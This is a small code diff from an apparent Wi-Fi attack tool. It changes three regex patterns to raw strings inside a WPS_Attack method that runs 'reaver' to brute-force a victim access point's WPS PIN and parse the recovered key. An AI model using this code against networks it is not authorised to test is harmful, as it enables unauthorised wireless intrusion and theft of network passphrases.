@@ -123,9 +123,9 @@ class WPS_Attack(QtCore.QThread):
 
     def _bruteforce_WPS_Device(self):
         channel = self._wps_client_info[self.victim_MAC_Addr.upper()]
-        wps_key_regex = re.compile(": '(\S+)'",re.IGNORECASE)
-        wps_pin_regex = re.compile("WPS PIN: '(\d+)'",re.IGNORECASE)
-        progress_regex = re.compile("(\d+\.\d+)%",re.IGNORECASE)
+        wps_key_regex = re.compile(r": '(\S+)'",re.IGNORECASE)
+        wps_pin_regex = re.compile(r"WPS PIN: '(\d+)'",re.IGNORECASE)
+        progress_regex = re.compile(r"(\d+\.\d+)%",re.IGNORECASE)
         associate_regex = re.compile("associated with",re.IGNORECASE)
 
         self.bruteforce_sys_proc = subprocess.Popen("reaver -i %s -b %s -c %s -a -N -L" %(self.monitor_interface,self.victim_MAC_Addr,channel),
